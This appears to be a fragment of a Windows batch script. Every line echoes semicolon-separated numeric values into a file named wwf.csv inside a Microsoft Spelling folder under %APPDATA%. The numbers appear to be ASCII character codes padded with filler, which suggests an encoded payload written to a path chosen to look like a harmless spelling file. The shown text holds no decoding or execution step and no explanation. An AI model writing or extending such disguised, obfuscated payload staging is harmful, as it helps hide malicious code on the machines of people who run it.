>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.70;105.4169;30.116;70.108;60.101;5584.30;26.387;0.470;0.6538;567.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(795.0;467.0;6404.811;0.812;0.821;0.2671;814.0;805.0;803.0;6231.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.816;0.644;87.2069;60.70;70.67;30.95;6415.50;72.60;101.70;108.1528;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.112;60.95;70.79;9719.60;112.60;116.50;105.2437;70.111;40.110;50.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2863.40;95.70;83.50;116.8057;50.97;40.114;30.116;2488.30;30.387;0.470;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1832;767.0;695.0;772.0;0530.801;0.808;0.812;0.3337;695.0;685.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.0;8047.397;0.803;0.801;0.6840;649.0;330.87;40.70;4151.40;67.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.30;72.4493;60.101;40.108;30.112;7564.70;95.70;85.30;115.0946;40.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.103;40.101;8747.50;51.40;30.787;0.7536;370.0;767.0;395.0;2279.672;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.808;0.1683;812.0;395.0;585.0;6001.815;0.397;0.803;0.3427;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;752.0;530.87;9079.40;70.40;67.70;95.3657;30.72;30.101;40.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4041.60;112.60;95.70;85.7408;70.115;60.97;60.103;5146.60;101.60;53.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.4252;387.0;370.0;667.0;4029.795;0.572;0.801;0.6351;808.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(795.0;4406.379;0.817;0.816;0.1162;812.0;817.0;816.0;8751.332;87.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.60;67.3324;70.95;70.72;60.101;2578.30;108.50;112.30;95.7562;50.79;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.117;60.116;0393.30;112.60;117.40;116.9662;60.49;60.32;787.0;9658.770;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.467;0.495;0.4783;372.0;801.0;808.0;5316.812;0.795;0.379;0.8130;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;816.0;812.0;2129.817;0.816;0.550;0.2618;536.87;50.70;70.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7235.30;95.70;72.40;101.3022;40.108;30.112;40.95;6213.30;79.40;117.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.0186;50.112;30.117;50.116;3773.40;50.30;95.40;49.5208;70.32;687.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(370.0;1745.467;0.595;0.672;0.7010;801.0;808.0;812.0;5605.795;0.779;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.8902;816.0;812.0;817.0;1348.816;0.752;0.532;87.9685;70.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.67;30.95;8808.40;72.40;101.70;108.9882;50.112;30.95;40.79;4722.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.30;116.60;112.3852;50.117;40.116;30.53;4459.50;32.487;0.770;0.0298;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(367.0;595.0;372.0;0218.801;0.808;0.812;0.6241;795.0;579.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4956.816;0.812;0.817;0.8530;816.0;454.0;734.87;7819.60;70.30;67.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.9896;70.72;40.101;50.108;8313.70;112.70;95.50;79.2402;40.117;40.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.112;3142.40;117.40;116.30;55.3446;50.97;30.34;487.0;5512.470;0.367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.395;0.4590;772.0;801.0;808.0;5262.812;0.795;0.579;0.6492;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;812.0;1199.817;0.816;0.555;0.1275;798.0;328.87;50.70;0045.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.60;95.70;72.8378;40.101;60.108;40.112;0623.30;95.60;73.70;110.1956;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.112;60.117;40.116;3530.30;30.387;0.370;0.0788;467.0;595.0;472.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4611.801;0.808;0.812;0.3411;595.0;773.0;810.0;5924.812;0.817;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1242;749.0;630.87;40.70;1362.50;67.50;95.50;72.1833;60.101;40.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.112;5699.60;95.70;73.30;110.1909;50.112;60.117;40.116;6483.60;50.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.487;0.9721;770.0;467.0;695.0;9284.472;0.801;0.808;0.3823;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(795.0;473.0;0799.810;0.812;0.817;0.1828;816.0;751.0;530.87;7531.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.60;67.50;95.3441;50.72;40.101;30.108;0610.40;112.50;95.40;73.8412;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.110;40.112;70.117;2068.70;116.50;52.60;30.9239;587.0;370.0;667.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3369.695;0.472;0.801;0.5619;808.0;812.0;795.0;4520.473;0.810;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1291;817.0;816.0;453.0;7974.530;87.30;70.60;67.9916;40.95;40.72;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.101;9184.40;108.70;112.60;95.8929;50.73;70.110;40.112;3284.70;117.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.50;54.8850;70.30;487.0;770.0;5365.367;0.695;0.672;0.7315;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;812.0;5896.395;0.473;0.810;0.2034;812.0;817.0;816.0;5613.755;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.430;87.70;70.6656;70.67;60.95;40.72;5355.60;101.30;108.50;112.7444;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.95;40.73;30.110;1537.40;112.30;117.50;116.0404;40.56;50.30;587.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0529.670;0.667;0.395;0.6089;772.0;801.0;808.0;1779.812;0.495;0.673;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0043;810.0;812.0;817.0;2407.816;0.657;0.432;87.2347;30.70;50.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.95;6477.70;72.50;101.50;108.0871;50.112;30.95;40.73;2949.40;110.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.30;117.3099;70.116;30.49;30.48;8620.70;32.687;0.770;0.6047;667.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(595.0;472.0;4993.801;0.808;0.812;0.1545;595.0;773.0;810.0;4040.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.817;0.816;0.2964;349.0;349.0;332.87;3242.40;70.70;67.60;95.6714;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.72;30.101;50.108;1689.60;112.30;95.70;73.1975;30.110;70.112;30.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9852.70;116.40;49.40;50.3863;40.32;587.0;670.0;8129.467;0.495;0.772;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7450;801.0;808.0;812.0;7032.795;0.473;0.810;0.8404;812.0;817.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;5271.449;0.551;0.646;87.6962;50.70;30.67;40.95;4698.50;72.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.40;108.0796;70.112;30.95;70.67;2728.70;111.40;100.40;101.2813;50.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.101;50.110;0633.70;101.40;114.60;97.4166;40.116;70.105;50.111;7906.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.30;30.587;0.3604;370.0;467.0;495.0;8946.372;0.801;0.808;0.3355;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;395.0;668.0;4393.801;0.598;0.817;0.7455;803.0;749.0;434.87;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6920.40;70.60;67.50;95.3974;40.72;50.101;40.108;3293.60;112.60;95.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(76.9161;40.97;60.110;40.103;6663.70;117.60;97.30;103.0926;50.101;30.36;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(687.0;4740.470;0.367;0.495;0.2833;772.0;801.0;808.0;3093.812;0.795;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.476;0.1085;597.0;810.0;803.0;5091.817;0.497;0.803;0.8097;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(549.0;536.87;1417.70;70.50;67.30;95.4287;40.72;70.101;30.108;3318.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.60;95.60;76.5499;50.97;70.110;50.103;9943.60;117.30;97.70;103.1349;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;70.50;40.46;0372.587;0.770;0.467;0.8505;695.0;472.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5247.808;0.812;0.395;0.2609;382.0;811.0;811.0;5266.816;0.578;0.497;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7883;809.0;801.0;815.0;1399.812;0.797;0.599;0.8584;801.0;649.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(446.87;4406.30;70.50;67.40;95.6735;40.72;30.101;30.108;2709.60;112.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.40;82.6970;50.111;60.111;60.116;7704.40;78.30;97.50;109.4787;60.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.115;70.112;2174.50;97.70;99.40;101.2425;40.50;60.46;787.0;7677.370;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.367;0.395;0.6488;372.0;801.0;808.0;1843.812;0.695;0.382;0.4824;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;811.0;816.0;8476.678;0.697;0.809;0.0425;801.0;815.0;812.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1234.497;0.599;0.801;0.9293;451.0;726.87;50.70;5793.60;67.70;95.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.1811;40.101;70.108;50.112;9278.30;95.40;77.60;105.6902;30.115;40.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.28;5008.387;0.770;0.467;0.5312;695.0;472.0;801.0;9948.808;0.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.495;0.3808;377.0;805.0;815.0;8785.799;0.549;0.528;87.5372;60.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.67;50.95;7088.60;72.50;101.50;108.9812;40.112;40.95;60.77;2077.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.50;115.70;99.2547;30.50;60.28;787.0;9517.770;0.767;0.695;0.4795;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(672.0;801.0;808.0;2924.812;0.395;0.377;0.9868;805.0;815.0;799.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4686.651;0.430;71.50;101.1266;60.110;70.101;30.114;0254.30;97.50;116.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.8379;30.100;30.69;40.114;1566.50;114.60;111.70;114.7946;40.115;70.38;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(767.0;1946.811;0.809;0.812;0.4779;805.0;808.0;597.0;0153.816;0.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.3001;810.0;570.0;805.0;5404.810;0.805;0.815;0.5305;804.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;800.0;1725.414;79.60;117.60;116.3604;70.76;50.111;50.110;3979.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.30;16.679;0.3487;817.0;816.0;583.0;1500.804;0.811;0.814;0.8354;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;334.82;60.111;0663.40;111.40;116.50;78.2571;50.97;50.109;50.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9543.30;115.30;112.40;97.7972;70.99;30.101;70.76;4963.40;111.30;110.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.9983;50.36;582.0;811.0;9207.811;0.816;0.378;0.4711;597.0;809.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;8179.815;0.812;0.397;0.4164;699.0;801.0;483.0;8724.804;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.3300;816.0;736.83;40.108;7058.40;97.30;115.40;104.3694;30.82;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;40.111;5934.60;116.50;78.40;97.6627;60.109;70.101;40.115;3970.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.60;97.30;99.2761;70.101;70.20;384.0;1388.697;0.814;0.803;0.5534;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;816.0;576.0;8809.811;0.810;0.803;0.2153;422.84;50.97;70.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4427.30;103.60;101.40;116.3392;60.83;60.104;50.111;6539.60;114.30;116.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(16.8922;365.0;815.0;815.0;9127.801;0.809;0.598;0.5798;808.0;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(36.69;8803.30;120.60;101.70;22.1884;476.0;805.0;598.0;6268.814;0.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.5234;821.0;576.0;811.0;9916.810;0.803;0.724;76.8816;60.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.98;70.114;3927.50;97.40;114.50;121.8789;60.83;60.104;60.111;2050.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.60;116.40;26.3981;682.0;801.0;802.0;4424.801;0.814;0.801;0.6241;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.0;599.0;801.0;6341.676;0.811;0.810;0.6080;803.0;328.82;30.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3384.30;102.50;101.60;114.7270;50.101;30.110;50.99;3612.60;101.30;83.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.7100;50.111;70.114;70.116;7849.70;24.382;0.801;0.7202;815.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.0;7954.814;0.499;0.801;0.3651;776.0;811.0;810.0;8057.803;0.426;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(82.70;101.0562;30.115;70.111;30.117;4760.50;114.40;99.30;101.2834;30.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.104;60.111;3433.60;114.60;116.50;18.8512;568.0;801.0;598.0;2452.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.803;0.576;0.7808;811.0;810.0;803.0;3298.720;68.30;101.30;98.6724;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.117;70.103;50.83;5247.50;104.30;111.40;114.9273;40.116;50.6;389.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9454.801;0.815;0.44;78.1898;70.111;60.24;676.0;4185.497;0.810;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7015;817.0;397.0;803.0;2364.801;0.676;0.811;0.8949;810.0;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(326.76;5194.70;97.40;110.70;103.9144;30.117;30.97;50.103;0748.60;101.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.60;104.8776;40.111;70.114;70.116;3423.50;16.372;0.801;0.2505;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;476.0;3062.811;0.810;0.803;0.4163;318.72;70.101;70.108;2391.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.30;83.50;104.7562;60.111;40.114;30.116;0962.40;4.667;0.583;0.2902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(44.86;30.66;60.20;0347.778;0.811;0.376;0.6430;811.0;803.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0189.676;0.811;0.810;0.5371;803.0;522.78;70.111;1911.70;76.40;111.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.9096;70.111;50.83;30.104;9734.30;111.60;114.40;116.2205;40.20;478.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;6119.387;0.697;0.814;0.7504;810.0;776.0;811.0;1610.810;0.803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.522;78.4903;40.111;60.87;50.97;0987.60;114.50;110.30;83.8696;50.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.111;70.114;8860.30;116.60;14.675;0.7696;801.0;821.0;470.0;9839.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.808;0.801;0.6732;724.75;50.101;40.121;7625.40;67.50;111.40;110.2328;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.116;30.97;60.105;7330.70;110.70;101.70;114.7426;60.18;468.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0263.808;0.597;0.821;0.2915;583.0;805.0;803.0;0858.810;0.620;78.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.5116;40.67;30.111;70.100;9349.40;101.30;76.30;111.0223;60.110;70.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.22;6820.678;0.811;0.767;0.7030;811.0;800.0;801.0;4742.383;0.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.811;0.1167;814.0;816.0;748.73;2864.60;110.40;118.40;97.8216;30.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.105;70.100;2430.50;78.40;111.50;67.7504;40.111;40.100;70.101;7947.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.60;119.70;105.0437;70.116;50.99;50.104;9088.70;86.70;97.40;108.5902;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.117;30.101;70.32;5784.587;0.370;0.567;0.9960;795.0;372.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9039.808;0.812;0.795;0.9200;678.0;811.0;367.0;1337.811;0.800;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.3564;349.0;532.87;70.70;5657.40;67.40;95.50;72.9976;70.101;50.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.112;3864.30;95.40;78.70;111.7329;40.67;40.111;50.100;4017.30;101.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.40;28.6202;667.0;804.0;801.0;2789.499;0.807;0.484;0.1081;821.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.0;801.0;3404.815;0.676;0.811;0.9493;810.0;803.0;530.67;8477.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.40;101.50;99.9216;70.107;40.84;30.121;6678.40;112.70;101.30;115.1731;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.83;40.104;50.111;0699.70;114.70;116.70;56.0401;373.0;810.0;818.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9841.397;0.808;0.805;0.7772;800.0;767.0;804.0;7179.801;0.499;0.807;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1905;784.0;821.0;812.0;3859.801;0.815;0.783;0.8967;819.0;805.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.0;2273.399;0.804;0.486;0.8792;797.0;808.0;817.0;4282.801;0.350;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.30;97.1995;60.108;60.105;40.100;7946.70;97.30;116.40;101.2147;30.82;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;70.111;7237.70;116.40;65.40;99.6011;40.116;60.105;60.118;7602.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.50;105.70;101.8988;30.115;70.76;60.111;2262.40;110.30;103.50;52.5829;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(486.0;797.0;808.0;8351.805;0.800;0.597;0.1616;816.0;801.0;582.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4696.811;0.811;0.816;0.1804;465.0;799.0;816.0;0017.805;0.818;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.7328;805.0;801.0;815.0;2470.683;0.804;0.811;0.7186;814.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(378.73;5636.30;110.30;118.30;97.2902;60.108;30.105;40.100;1319.70;86.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.30;108.8021;60.105;50.100;70.97;9641.40;116.30;101.50;82.6705;70.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.111;70.116;9996.60;65.40;99.60;116.7894;60.105;60.118;30.116;4829.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.40;101.40;115.0407;60.83;30.119;30.105;3655.30;116.70;99.30;104.8194;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.86;30.97;70.108;2319.60;117.70;101.40;40.8020;587.0;570.0;567.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6008.695;0.472;0.801;0.6787;808.0;812.0;595.0;5439.467;0.804;0.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.0793;699.0;807.0;784.0;2376.821;0.812;0.801;0.6416;815.0;749.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(740.87;9086.40;70.70;67.40;95.4177;70.72;60.101;30.108;7068.40;112.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(95.60;67.9358;30.104;40.101;50.99;3268.40;107.70;84.60;121.4962;30.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.101;30.115;7149.60;50.60;8.484;0.6823;814.0;817.0;801.0;0143.610;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.40;97.60;108.5752;30.115;70.101;30.58;2459.769;0.814;0.814;0.9381;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.0;814.0;395.0;8219.685;0.815;0.801;0.5193;814.0;467.0;811.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3879.800;0.801;0.570;0.1288;805.0;808.0;801.0;2144.815;0.478;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.6949;816.0;665.0;808.0;9372.808;0.811;0.819;0.5288;801.0;800.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(352.69;1710.30;114.40;114.30;111.5371;50.114;60.95;60.67;5409.70;111.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.40;101.4382;30.87;50.105;30.116;1620.60;104.70;105.50;110.5733;70.78;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.111;70.116;1906.50;65.30;108.50;108.4904;30.111;60.119;30.101;4820.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.60;46.569;0.5826;814.0;814.0;811.0;0256.814;0.595;0.684;0.1494;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.0;812.0;801.0;8065.478;0.811;0.816;0.6772;465.0;817.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6912.804;0.811;0.814;0.2597;805.0;822.0;801.0;9915.800;0.462;87.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.8959;60.67;60.95;70.72;9894.60;101.40;108.50;112.0785;60.95;30.86;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.97;8104.30;108.30;105.30;100.3121;40.97;70.116;40.101;4695.40;82.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.30;111.4945;40.116;70.65;30.99;1911.50;116.70;105.60;118.3153;50.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.105;50.101;4154.50;115.70;49.60;62.3638;587.0;770.0;367.0;5885.695;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.372;0.801;0.9362;808.0;812.0;395.0;1323.486;0.397;0.808;0.5210;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;800.0;597.0;1635.816;0.801;0.482;0.8819;811.0;811.0;816.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9064.365;0.599;0.816;0.7477;805.0;818.0;816.0;5710.805;0.801;0.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.1174;450.0;644.71;50.101;7178.50;110.50;101.40;114.0410;30.97;70.108;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.95;6013.60;77.60;105.40;115.2285;70.115;60.105;70.110;3154.50;103.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(83.50;101.4500;40.114;40.118;30.105;4128.30;99.60;101.60;38.6165;784.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(597.0;814.0;3239.803;0.801;0.816;0.8400;570.0;814.0;797.0;1687.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.819;0.1777;811.0;814.0;807.0;2825.576;0.811;0.810;0.5543;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.0;640.84;50.97;1752.40;114.60;103.60;101.7625;50.116;50.70;40.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3375.60;97.50;109.40;101.8264;50.119;50.111;30.114;6812.40;107.40;83.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.2554;40.111;70.114;40.116;4968.30;34.784;0.497;0.6959;814.0;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;1945.816;0.670;0.814;0.2070;597.0;809.0;801.0;0241.819;0.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.4210;807.0;751.0;548.0;8139.634;84.40;97.50;114.4250;40.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(30.101;40.116;7990.60;70.30;114.70;97.4714;70.109;60.101;60.119;6280.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.40;114.40;107.8175;70.51;30.53;50.34;5094.484;0.597;0.814;0.0808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.0;801.0;816.0;6820.770;0.814;0.697;0.0258;809.0;801.0;819.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9256.811;0.814;0.807;0.7138;652.0;548.0;746.84;0660.50;97.40;114.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(103.3733;50.101;30.116;50.70;5651.70;114.40;97.30;109.5454;70.101;70.119;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.111;5133.60;114.30;107.30;52.9710;30.48;50.80;70.114;1318.40;101.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.70;105.5214;40.120;70.66;473.0;2922.810;0.818;0.797;0.0552;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.0;800.0;7631.684;0.797;0.814;0.4269;803.0;801.0;816.0;2509.570;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.814;0.397;0.0775;809.0;801.0;819.0;6561.811;0.814;0.807;0.3460;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(583.0;819.0;805.0;6017.816;0.699;0.804;0.3965;486.0;397.0;808.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7278.817;0.801;0.636;87.1449;40.70;30.67;30.95;1494.60;72.30;101.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.0392;30.112;40.95;50.84;3477.60;97.40;114.50;103.5169;50.101;70.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.70;5290.70;120.70;49.40;36.8027;587.0;670.0;567.0;8768.795;0.672;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.801;0.2265;808.0;812.0;595.0;5957.484;0.697;0.814;0.7803;803.0;
